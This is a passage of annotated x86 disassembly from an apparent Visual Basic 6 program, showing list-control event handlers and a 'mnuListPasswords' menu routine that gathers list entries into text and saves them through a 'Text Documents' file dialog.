008D6CA1: lea eax, var_2C
008D6CA4: push eax
008D6CA5: lea eax, var_28
008D6CA8: push eax
008D6CA9: lea eax, var_24
008D6CAC: push eax
008D6CAD: push 00000003h
008D6CAF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6CB4: add esp, 00000010h
008D6CB7: lea eax, var_4C
008D6CBA: push eax
008D6CBB: lea eax, var_3C
008D6CBE: push eax
008D6CBF: push 00000002h
008D6CC1: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D6CC6: add esp, 0000000Ch
008D6CC9: mov var_10, 00000000h
008D6CD0: wait 
008D6CD1: push 008D6D02h
008D6CD6: jmp 8D6D01h
008D6CD8: lea eax, var_2C
008D6CDB: push eax
008D6CDC: lea eax, var_28
008D6CDF: push eax
008D6CE0: lea eax, var_24
008D6CE3: push eax
008D6CE4: push 00000003h
008D6CE6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D6CEB: add esp, 00000010h
008D6CEE: lea eax, var_4C
008D6CF1: push eax
008D6CF2: lea eax, var_3C
008D6CF5: push eax
008D6CF6: push 00000002h
008D6CF8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D6CFD: add esp, 0000000Ch
008D6D00: ret 
End Sub

Private sub lstReport__8D78FC
008D78FC: push ebp
008D78FD: mov ebp, esp
008D78FF: sub esp, 0000000Ch
008D7902: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D7907: mov eax, fs:[00h]
008D790D: push eax
008D790E: mov fs:[00000000h], esp
008D7915: push 00000054h
008D7917: pop eax
008D7918: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D791D: push ebx
008D791E: push esi
008D791F: push edi
008D7920: mov var_0C, esp
008D7923: mov var_08, 0040FD60h
008D792A: mov eax, [ebp+08h]
008D792D: and eax, 00000001h
008D7930: mov var_04, eax
008D7933: mov eax, [ebp+08h]
008D7936: and al, FEh
008D7938: mov [ebp+08h], eax
008D793B: mov eax, [ebp+08h]
008D793E: mov eax, [eax]
008D7940: push [ebp+08h]
008D7943: call [eax+04h]
008D7946: mov eax, [ebp+0Ch]
008D7949: cmp word ptr [eax], 0002h
008D794D: jnz 008D7A27h
008D7953: mov var_50, 80020004h
008D795A: mov var_58, 0000000Ah
008D7961: mov var_40, 80020004h
008D7968: mov var_48, 0000000Ah
008D796F: mov var_30, 80020004h
008D7976: mov var_38, 0000000Ah
008D797D: mov var_20, 80020004h
008D7984: mov var_28, 0000000Ah
008D798B: push 00000010h
008D798D: pop eax
008D798E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7993: lea esi, var_58
008D7996: mov edi, esp
008D7998: movsd 
008D7999: movsd 
008D799A: movsd 
008D799B: movsd 
008D799C: push 00000010h
008D799E: pop eax
008D799F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D79A4: lea esi, var_48
008D79A7: mov edi, esp
008D79A9: movsd 
008D79AA: movsd 
008D79AB: movsd 
008D79AC: movsd 
008D79AD: push 00000010h
008D79AF: pop eax
008D79B0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D79B5: lea esi, var_38
008D79B8: mov edi, esp
008D79BA: movsd 
008D79BB: movsd 
008D79BC: movsd 
008D79BD: movsd 
008D79BE: push 00000010h
008D79C0: pop eax
008D79C1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D79C6: lea esi, var_28
008D79C9: mov edi, esp
008D79CB: movsd 
008D79CC: movsd 
008D79CD: movsd 
008D79CE: movsd 
008D79CF: mov eax, [ebp+08h]
008D79D2: mov eax, [eax]
008D79D4: push [ebp+08h]
008D79D7: call [eax+00000300h]
008D79DD: push eax
008D79DE: lea eax, var_18
008D79E1: push eax
008D79E2: call 00410A84h ; Set (object)
008D79E7: push eax
008D79E8: mov eax, [ebp+08h]
008D79EB: mov eax, [eax]
008D79ED: push [ebp+08h]
008D79F0: call [eax+000002BCh]
008D79F6: fclex 
008D79F8: mov var_5C, eax
008D79FB: cmp var_5C, 00000000h
008D79FF: jnl 8D7A1Bh
008D7A01: push 000002BCh
008D7A06: push 0044800Ch
008D7A0B: push [ebp+08h]
008D7A0E: push var_5C
008D7A11: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D7A16: mov var_68, eax
008D7A19: jmp 8D7A1Fh
008D7A1B: and var_68, 00000000h
008D7A1F: lea ecx, var_18
008D7A22: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D7A27: mov var_04, 00000000h
008D7A2E: push 008D7A3Fh
008D7A33: jmp 8D7A3Eh
008D7A35: lea ecx, var_18
008D7A38: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D7A3D: ret 
End Sub

Private sub lstReport__8D6D26
008D6D26: push ebp
008D6D27: mov ebp, esp
008D6D29: sub esp, 0000000Ch
008D6D2C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D6D31: mov eax, fs:[00h]
008D6D37: push eax
008D6D38: mov fs:[00000000h], esp
008D6D3F: push 00000008h
008D6D41: pop eax
008D6D42: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6D47: push ebx
008D6D48: push esi
008D6D49: push edi
008D6D4A: mov var_0C, esp
008D6D4D: mov var_08, 0040FD38h
008D6D54: mov eax, [ebp+08h]
008D6D57: and eax, 00000001h
008D6D5A: mov var_04, eax
008D6D5D: mov eax, [ebp+08h]
008D6D60: and al, FEh
008D6D62: mov [ebp+08h], eax
008D6D65: mov eax, [ebp+08h]
008D6D68: mov eax, [eax]
008D6D6A: push [ebp+08h]
008D6D6D: call [eax+04h]
008D6D70: mov eax, [ebp+0Ch]
008D6D73: or word ptr [eax], FFFFh
008D6D77: mov var_04, 00000000h
008D6D7E: mov eax, [ebp+08h]
008D6D81: mov eax, [eax]
008D6D83: push [ebp+08h]
008D6D86: call [eax+08h]
008D6D89: mov eax, var_04
008D6D8C: mov ecx, var_14
008D6D8F: mov fs:[00000000h], ecx
008D6D96: pop edi
008D6D97: pop esi
008D6D98: pop ebx
008D6D99: leave 
008D6D9A: retn 0008h
End Sub

Private sub lstReport__8D6D9D
008D6D9D: push ebp
008D6D9E: mov ebp, esp
008D6DA0: sub esp, 0000000Ch
008D6DA3: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D6DA8: mov eax, fs:[00h]
008D6DAE: push eax
008D6DAF: mov fs:[00000000h], esp
008D6DB6: push 00000044h
008D6DB8: pop eax
008D6DB9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6DBE: push ebx
008D6DBF: push esi
008D6DC0: push edi
008D6DC1: mov var_0C, esp
008D6DC4: mov var_08, 0040FD40h
008D6DCB: mov eax, [ebp+08h]
008D6DCE: and eax, 00000001h
008D6DD1: mov var_04, eax
008D6DD4: mov eax, [ebp+08h]
008D6DD7: and al, FEh
008D6DD9: mov [ebp+08h], eax
008D6DDC: mov eax, [ebp+08h]
008D6DDF: mov eax, [eax]
008D6DE1: push [ebp+08h]
008D6DE4: call [eax+04h]
008D6DE7: push [ebp+0Ch]
008D6DEA: lea eax, var_18
008D6DED: push eax
008D6DEE: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008D6DF3: mov eax, [ebp+08h]
008D6DF6: mov eax, [eax]
008D6DF8: push [ebp+08h]
008D6DFB: call [eax+00000308h]
008D6E01: push eax
008D6E02: lea eax, var_50
008D6E05: push eax
008D6E06: call 00410A84h ; Set (object)
008D6E0B: push 00000000h
008D6E0D: push 00000005h
008D6E0F: push var_18
008D6E12: lea eax, var_2C
008D6E15: push eax
008D6E16: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6E1B: add esp, 00000010h
008D6E1E: push eax
008D6E1F: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D6E24: sub eax, 00000001h
008D6E27: jo 008D6F23h
008D6E2D: mov var_34, eax
008D6E30: mov var_3C, 00000003h
008D6E37: push 00000010h
008D6E39: pop eax
008D6E3A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6E3F: lea esi, var_3C
008D6E42: mov edi, esp
008D6E44: movsd 
008D6E45: movsd 
008D6E46: movsd 
008D6E47: movsd 
008D6E48: push 00000012h
008D6E4A: push var_50
008D6E4D: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008D6E52: lea ecx, var_2C
008D6E55: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D6E5A: or var_34, FFFFFFFFh
008D6E5E: mov var_3C, 0000000Bh
008D6E65: push 00000010h
008D6E67: pop eax
008D6E68: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6E6D: lea esi, var_3C
008D6E70: mov edi, esp
008D6E72: movsd 
008D6E73: movsd 
008D6E74: movsd 
008D6E75: movsd 
008D6E76: push 00000011h
008D6E78: push var_50
008D6E7B: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008D6E80: push 00000000h
008D6E82: push 00000013h
008D6E84: push var_50
008D6E87: lea eax, var_2C
008D6E8A: push eax
008D6E8B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6E90: add esp, 00000010h
008D6E93: push eax
008D6E94: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D6E99: xor eax, 00000001h
008D6E9C: mov var_34, eax
008D6E9F: mov var_3C, 00000003h
008D6EA6: push 00000010h
008D6EA8: pop eax
008D6EA9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6EAE: lea esi, var_3C
008D6EB1: mov edi, esp
008D6EB3: movsd 
008D6EB4: movsd 
008D6EB5: movsd 
008D6EB6: movsd 
008D6EB7: push 00000013h
008D6EB9: push var_50
008D6EBC: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008D6EC1: lea ecx, var_2C
008D6EC4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D6EC9: push 00000000h
008D6ECB: lea eax, var_50
008D6ECE: push eax
008D6ECF: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008D6ED4: mov var_04, 00000000h
008D6EDB: push 008D6F04h
008D6EE0: jmp 8D6EEBh
008D6EE2: lea ecx, var_2C
008D6EE5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008D6EEA: ret 
End Sub

Private sub mnuListPasswords__8D7A5E
008D7A5E: push ebp
008D7A5F: mov ebp, esp
008D7A61: sub esp, 00000018h
008D7A64: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D7A69: mov eax, fs:[00h]
008D7A6F: push eax
008D7A70: mov fs:[00000000h], esp
008D7A77: mov eax, 00000180h
008D7A7C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7A81: push ebx
008D7A82: push esi
008D7A83: push edi
008D7A84: mov var_18, esp
008D7A87: mov var_14, 0040FD70h
008D7A8E: mov eax, [ebp+08h]
008D7A91: and eax, 00000001h
008D7A94: mov var_10, eax
008D7A97: mov eax, [ebp+08h]
008D7A9A: and al, FEh
008D7A9C: mov [ebp+08h], eax
008D7A9F: mov var_0C, 00000000h
008D7AA6: mov eax, [ebp+08h]
008D7AA9: mov eax, [eax]
008D7AAB: push [ebp+08h]
008D7AAE: call [eax+04h]
008D7AB1: mov var_04, 00000001h
008D7AB8: mov var_04, 00000002h
008D7ABF: push FFFFFFFFh
008D7AC1: call 00410A60h ; On Error ...
008D7AC6: mov var_04, 00000003h
008D7ACD: mov eax, [ebp+0Ch]
008D7AD0: mov ax, [eax]
008D7AD3: mov var_0000015C, ax
008D7ADA: movsx eax, word ptr var_0000015C
008D7AE1: mov var_0000017C, eax
008D7AE7: cmp var_0000017C, 00000000h
008D7AEE: jz 8D7B07h
008D7AF0: cmp var_0000017C, 00000002h
008D7AF7: jz 008D8189h
008D7AFD: jmp 008D86AEh
008D7B02: jmp 008D86AEh
008D7B07: mov var_04, 00000005h
008D7B0E: mov var_000000D0, 00000001h
008D7B18: mov var_000000D8, 00000002h
008D7B22: push 00000000h
008D7B24: push 00000001h
008D7B26: push 00440E48h
008D7B2B: push 00000000h
008D7B2D: push 00000018h
008D7B2F: mov eax, [ebp+08h]
008D7B32: mov eax, [eax]
008D7B34: push [ebp+08h]
008D7B37: call [eax+00000308h]
008D7B3D: push eax
008D7B3E: lea eax, var_54
008D7B41: push eax
008D7B42: call 00410A84h ; Set (object)
008D7B47: push eax
008D7B48: lea eax, var_78
008D7B4B: push eax
008D7B4C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7B51: add esp, 00000010h
008D7B54: push eax
008D7B55: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7B5A: push eax
008D7B5B: lea eax, var_58
008D7B5E: push eax
008D7B5F: call 00410A84h ; Set (object)
008D7B64: push eax
008D7B65: lea eax, var_00000088
008D7B6B: push eax
008D7B6C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7B71: add esp, 00000010h
008D7B74: push eax
008D7B75: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D7B7A: mov var_000000E0, eax
008D7B80: mov var_000000E8, 00000003h
008D7B8A: mov var_000000F0, 00000001h
008D7B94: mov var_000000F8, 00000002h
008D7B9E: lea eax, var_000000D8
008D7BA4: push eax
008D7BA5: lea eax, var_000000E8
008D7BAB: push eax
008D7BAC: lea eax, var_000000F8
008D7BB2: push eax
008D7BB3: lea eax, var_00000138
008D7BB9: push eax
008D7BBA: lea eax, var_00000128
008D7BC0: push eax
008D7BC1: lea eax, var_30
008D7BC4: push eax
008D7BC5: call 00410A3Ch ; For
008D7BCA: mov var_00000174, eax
008D7BD0: lea eax, var_58
008D7BD3: push eax
008D7BD4: lea eax, var_54
008D7BD7: push eax
008D7BD8: push 00000002h
008D7BDA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7BDF: add esp, 0000000Ch
008D7BE2: lea eax, var_00000088
008D7BE8: push eax
008D7BE9: lea eax, var_78
008D7BEC: push eax
008D7BED: push 00000002h
008D7BEF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7BF4: add esp, 0000000Ch
008D7BF7: jmp 008D7F78h
008D7BFC: mov var_04, 00000006h
008D7C03: lea eax, var_30
008D7C06: mov var_000000D0, eax
008D7C0C: mov var_000000D8, 0000400Ch
008D7C16: push 00000000h
008D7C18: push 00000004h
008D7C1A: push 00440E58h
008D7C1F: push 00000010h
008D7C21: pop eax
008D7C22: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7C27: lea esi, var_000000D8
008D7C2D: mov edi, esp
008D7C2F: movsd 
008D7C30: movsd 
008D7C31: movsd 
008D7C32: movsd 
008D7C33: push 00000001h
008D7C35: push 00000000h
008D7C37: push 00440E48h
008D7C3C: push 00000000h
008D7C3E: push 00000018h
008D7C40: mov eax, [ebp+08h]
008D7C43: mov eax, [eax]
008D7C45: push [ebp+08h]
008D7C48: call [eax+00000308h]
008D7C4E: push eax
008D7C4F: lea eax, var_54
008D7C52: push eax
008D7C53: call 00410A84h ; Set (object)
008D7C58: push eax
008D7C59: lea eax, var_78
008D7C5C: push eax
008D7C5D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7C62: add esp, 00000010h
008D7C65: push eax
008D7C66: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7C6B: push eax
008D7C6C: lea eax, var_58
008D7C6F: push eax
008D7C70: call 00410A84h ; Set (object)
008D7C75: push eax
008D7C76: lea eax, var_00000088
008D7C7C: push eax
008D7C7D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7C82: add esp, 00000020h
008D7C85: push eax
008D7C86: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7C8B: push eax
008D7C8C: lea eax, var_5C
008D7C8F: push eax
008D7C90: call 00410A84h ; Set (object)
008D7C95: push eax
008D7C96: lea eax, var_00000098
008D7C9C: push eax
008D7C9D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7CA2: add esp, 00000010h
008D7CA5: push eax
008D7CA6: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D7CAB: sub ax, FFFFh
008D7CAF: neg ax
008D7CB2: sbb eax, eax
008D7CB4: inc eax
008D7CB5: neg eax
008D7CB7: mov var_0000010C, ax
008D7CBE: lea eax, var_5C
008D7CC1: push eax
008D7CC2: lea eax, var_58
008D7CC5: push eax
008D7CC6: lea eax, var_54
008D7CC9: push eax
008D7CCA: push 00000003h
008D7CCC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7CD1: add esp, 00000010h
008D7CD4: lea eax, var_00000098
008D7CDA: push eax
008D7CDB: lea eax, var_00000088
008D7CE1: push eax
008D7CE2: lea eax, var_78
008D7CE5: push eax
008D7CE6: push 00000003h
008D7CE8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7CED: add esp, 00000010h
008D7CF0: movsx eax, word ptr var_0000010C
008D7CF7: test eax, eax
008D7CF9: jz 008D7F54h
008D7CFF: mov var_04, 00000007h
008D7D06: lea eax, var_30
008D7D09: mov var_000000D0, eax
008D7D0F: mov var_000000D8, 0000400Ch
008D7D19: mov var_000000F0, 00000001h
008D7D23: mov var_000000F8, 00000003h
008D7D2D: lea eax, var_30
008D7D30: mov var_000000E0, eax
008D7D36: mov var_000000E8, 0000400Ch
008D7D40: push var_38
008D7D43: push 00000000h
008D7D45: push 00000000h
008D7D47: push 00440E58h
008D7D4C: push 00000010h
008D7D4E: pop eax
008D7D4F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7D54: lea esi, var_000000D8
008D7D5A: mov edi, esp
008D7D5C: movsd 
008D7D5D: movsd 
008D7D5E: movsd 
008D7D5F: movsd 
008D7D60: push 00000001h
008D7D62: push 00000000h
008D7D64: push 00440E48h
008D7D69: push 00000000h
008D7D6B: push 00000018h
008D7D6D: mov eax, [ebp+08h]
008D7D70: mov eax, [eax]
008D7D72: push [ebp+08h]
008D7D75: call [eax+00000308h]
008D7D7B: push eax
008D7D7C: lea eax, var_54
008D7D7F: push eax
008D7D80: call 00410A84h ; Set (object)
008D7D85: push eax
008D7D86: lea eax, var_78
008D7D89: push eax
008D7D8A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7D8F: add esp, 00000010h
008D7D92: push eax
008D7D93: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7D98: push eax
008D7D99: lea eax, var_58
008D7D9C: push eax
008D7D9D: call 00410A84h ; Set (object)
008D7DA2: push eax
008D7DA3: lea eax, var_00000088
008D7DA9: push eax
008D7DAA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7DAF: add esp, 00000020h
008D7DB2: push eax
008D7DB3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7DB8: push eax
008D7DB9: lea eax, var_5C
008D7DBC: push eax
008D7DBD: call 00410A84h ; Set (object)
008D7DC2: push eax
008D7DC3: lea eax, var_00000098
008D7DC9: push eax
008D7DCA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7DCF: add esp, 00000010h
008D7DD2: push eax
008D7DD3: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D7DD8: mov edx, eax
008D7DDA: lea ecx, var_40
008D7DDD: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7DE2: push eax
008D7DE3: call 00410A18h ; &
008D7DE8: mov edx, eax
008D7DEA: lea ecx, var_44
008D7DED: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7DF2: push eax
008D7DF3: push 004412B8h
008D7DF8: call 00410A18h ; &
008D7DFD: mov edx, eax
008D7DFF: lea ecx, var_48
008D7E02: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7E07: push eax
008D7E08: push 00000010h
008D7E0A: pop eax
008D7E0B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7E10: lea esi, var_000000F8
008D7E16: mov edi, esp
008D7E18: movsd 
008D7E19: movsd 
008D7E1A: movsd 
008D7E1B: movsd 
008D7E1C: push 00000001h
008D7E1E: push 00000010h
008D7E20: push 00440E58h
008D7E25: push 00000010h
008D7E27: pop eax
008D7E28: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D7E2D: lea esi, var_000000E8
008D7E33: mov edi, esp
008D7E35: movsd 
008D7E36: movsd 
008D7E37: movsd 
008D7E38: movsd 
008D7E39: push 00000001h
008D7E3B: push 00000000h
008D7E3D: push 00440E48h
008D7E42: push 00000000h
008D7E44: push 00000018h
008D7E46: mov eax, [ebp+08h]
008D7E49: mov eax, [eax]
008D7E4B: push [ebp+08h]
008D7E4E: call [eax+00000308h]
008D7E54: push eax
008D7E55: lea eax, var_60
008D7E58: push eax
008D7E59: call 00410A84h ; Set (object)
008D7E5E: push eax
008D7E5F: lea eax, var_000000A8
008D7E65: push eax
008D7E66: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7E6B: add esp, 00000010h
008D7E6E: push eax
008D7E6F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7E74: push eax
008D7E75: lea eax, var_64
008D7E78: push eax
008D7E79: call 00410A84h ; Set (object)
008D7E7E: push eax
008D7E7F: lea eax, var_000000B8
008D7E85: push eax
008D7E86: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7E8B: add esp, 00000020h
008D7E8E: push eax
008D7E8F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7E94: push eax
008D7E95: lea eax, var_68
008D7E98: push eax
008D7E99: call 00410A84h ; Set (object)
008D7E9E: push eax
008D7E9F: lea eax, var_000000C8
008D7EA5: push eax
008D7EA6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7EAB: add esp, 00000020h
008D7EAE: push eax
008D7EAF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008D7EB4: mov edx, eax
008D7EB6: lea ecx, var_4C
008D7EB9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7EBE: push eax
008D7EBF: call 00410A18h ; &
008D7EC4: mov edx, eax
008D7EC6: lea ecx, var_50
008D7EC9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7ECE: push eax
008D7ECF: push 00441264h ; vbCrLf
008D7ED4: call 00410A18h ; &
008D7ED9: mov edx, eax
008D7EDB: lea ecx, var_38
008D7EDE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7EE3: lea eax, var_50
008D7EE6: push eax
008D7EE7: lea eax, var_4C
008D7EEA: push eax
008D7EEB: lea eax, var_48
008D7EEE: push eax
008D7EEF: lea eax, var_44
008D7EF2: push eax
008D7EF3: lea eax, var_40
008D7EF6: push eax
008D7EF7: push 00000005h
008D7EF9: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D7EFE: add esp, 00000018h
008D7F01: lea eax, var_68
008D7F04: push eax
008D7F05: lea eax, var_64
008D7F08: push eax
008D7F09: lea eax, var_60
008D7F0C: push eax
008D7F0D: lea eax, var_5C
008D7F10: push eax
008D7F11: lea eax, var_58
008D7F14: push eax
008D7F15: lea eax, var_54
008D7F18: push eax
008D7F19: push 00000006h
008D7F1B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7F20: add esp, 0000001Ch
008D7F23: lea eax, var_000000C8
008D7F29: push eax
008D7F2A: lea eax, var_000000B8
008D7F30: push eax
008D7F31: lea eax, var_000000A8
008D7F37: push eax
008D7F38: lea eax, var_00000098
008D7F3E: push eax
008D7F3F: lea eax, var_00000088
008D7F45: push eax
008D7F46: lea eax, var_78
008D7F49: push eax
008D7F4A: push 00000006h
008D7F4C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7F51: add esp, 0000001Ch
008D7F54: mov var_04, 00000009h
008D7F5B: lea eax, var_00000138
008D7F61: push eax
008D7F62: lea eax, var_00000128
008D7F68: push eax
008D7F69: lea eax, var_30
008D7F6C: push eax
008D7F6D: call 00410A36h ; Next
008D7F72: mov var_00000174, eax
008D7F78: cmp var_00000174, 00000000h
008D7F7F: jnz 008D7BFCh
008D7F85: mov var_04, 0000000Ah
008D7F8C: cmp [008F529Ch], 00000000h
008D7F93: jnz 8D7FB0h
008D7F95: push 008F529Ch
008D7F9A: push 00440F2Ch
008D7F9F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D7FA4: mov var_00000180, 008F529Ch
008D7FAE: jmp 8D7FBAh
008D7FB0: mov var_00000180, 008F529Ch
008D7FBA: mov eax, var_00000180
008D7FC0: mov eax, [eax]
008D7FC2: mov var_0000010C, eax
008D7FC8: lea eax, var_54
008D7FCB: push eax
008D7FCC: mov eax, var_0000010C
008D7FD2: mov eax, [eax]
008D7FD4: push var_0000010C
008D7FDA: call [eax+1Ch]
008D7FDD: fclex 
008D7FDF: mov var_00000110, eax
008D7FE5: cmp var_00000110, 00000000h
008D7FEC: jnl 8D800Eh
008D7FEE: push 0000001Ch
008D7FF0: push 00440F1Ch
008D7FF5: push var_0000010C
008D7FFB: push var_00000110
008D8001: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D8006: mov var_00000184, eax
008D800C: jmp 8D8015h
008D800E: and var_00000184, 00000000h
008D8015: mov eax, var_54
008D8018: mov var_00000114, eax
008D801E: mov eax, var_00000114
008D8024: mov eax, [eax]
008D8026: push var_00000114
008D802C: call [eax+50h]
008D802F: fclex 
008D8031: mov var_00000118, eax
008D8037: cmp var_00000118, 00000000h
008D803E: jnl 8D8060h
008D8040: push 00000050h
008D8042: push 00445554h
008D8047: push var_00000114
008D804D: push var_00000118
008D8053: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D8058: mov var_00000188, eax
008D805E: jmp 8D8067h
008D8060: and var_00000188, 00000000h
008D8067: lea ecx, var_54
008D806A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D806F: mov var_04, 0000000Bh
008D8076: cmp [008F529Ch], 00000000h
008D807D: jnz 8D809Ah
008D807F: push 008F529Ch
008D8084: push 00440F2Ch
008D8089: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D808E: mov var_0000018C, 008F529Ch
008D8098: jmp 8D80A4h
008D809A: mov var_0000018C, 008F529Ch
008D80A4: mov eax, var_0000018C
008D80AA: mov eax, [eax]
008D80AC: mov var_0000010C, eax
008D80B2: lea eax, var_54
008D80B5: push eax
008D80B6: mov eax, var_0000010C
008D80BC: mov eax, [eax]
008D80BE: push var_0000010C
008D80C4: call [eax+1Ch]
008D80C7: fclex 
008D80C9: mov var_00000110, eax
008D80CF: cmp var_00000110, 00000000h
008D80D6: jnl 8D80F8h
008D80D8: push 0000001Ch
008D80DA: push 00440F1Ch
008D80DF: push var_0000010C
008D80E5: push var_00000110
008D80EB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D80F0: mov var_00000190, eax
008D80F6: jmp 8D80FFh
008D80F8: and var_00000190, 00000000h
008D80FF: mov eax, var_54
008D8102: mov var_00000114, eax
008D8108: mov var_000000D0, 80020004h
008D8112: mov var_000000D8, 0000000Ah
008D811C: push 00000010h
008D811E: pop eax
008D811F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D8124: lea esi, var_000000D8
008D812A: mov edi, esp
008D812C: movsd 
008D812D: movsd 
008D812E: movsd 
008D812F: movsd 
008D8130: push var_38
008D8133: mov eax, var_00000114
008D8139: mov eax, [eax]
008D813B: push var_00000114
008D8141: call [eax+60h]
008D8144: fclex 
008D8146: mov var_00000118, eax
008D814C: cmp var_00000118, 00000000h
008D8153: jnl 8D8175h
008D8155: push 00000060h
008D8157: push 00445554h
008D815C: push var_00000114
008D8162: push var_00000118
008D8168: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D816D: mov var_00000194, eax
008D8173: jmp 8D817Ch
008D8175: and var_00000194, 00000000h
008D817C: lea ecx, var_54
008D817F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D8184: jmp 008D86AEh
008D8189: mov var_04, 0000000Dh
008D8190: cmp [008F529Ch], 00000000h
008D8197: jnz 8D81B4h
008D8199: push 008F529Ch
008D819E: push 00440F2Ch
008D81A3: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D81A8: mov var_00000198, 008F529Ch
008D81B2: jmp 8D81BEh
008D81B4: mov var_00000198, 008F529Ch
008D81BE: mov eax, var_00000198
008D81C4: mov eax, [eax]
008D81C6: mov var_0000010C, eax
008D81CC: lea eax, var_54
008D81CF: push eax
008D81D0: mov eax, var_0000010C
008D81D6: mov eax, [eax]
008D81D8: push var_0000010C
008D81DE: call [eax+14h]
008D81E1: fclex 
008D81E3: mov var_00000110, eax
008D81E9: cmp var_00000110, 00000000h
008D81F0: jnl 8D8212h
008D81F2: push 00000014h
008D81F4: push 00440F1Ch
008D81F9: push var_0000010C
008D81FF: push var_00000110
008D8205: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D820A: mov var_0000019C, eax
008D8210: jmp 8D8219h
008D8212: and var_0000019C, 00000000h
008D8219: mov eax, var_54
008D821C: mov var_00000114, eax
008D8222: lea eax, var_40
008D8225: push eax
008D8226: mov eax, var_00000114
008D822C: mov eax, [eax]
008D822E: push var_00000114
008D8234: call [eax+50h]
008D8237: fclex 
008D8239: mov var_00000118, eax
008D823F: cmp var_00000118, 00000000h
008D8246: jnl 8D8268h
008D8248: push 00000050h
008D824A: push 00440F3Ch
008D824F: push var_00000114
008D8255: push var_00000118
008D825B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D8260: mov var_000001A0, eax
008D8266: jmp 8D826Fh
008D8268: and var_000001A0, 00000000h
008D826F: push 00000000h
008D8271: push 00000000h
008D8273: push var_40
008D8276: push 0044558Ch ; txt
008D827B: push 00452FD0h ; Text Documents
008D8280: call 007CCC4Dh
008D8285: mov edx, eax
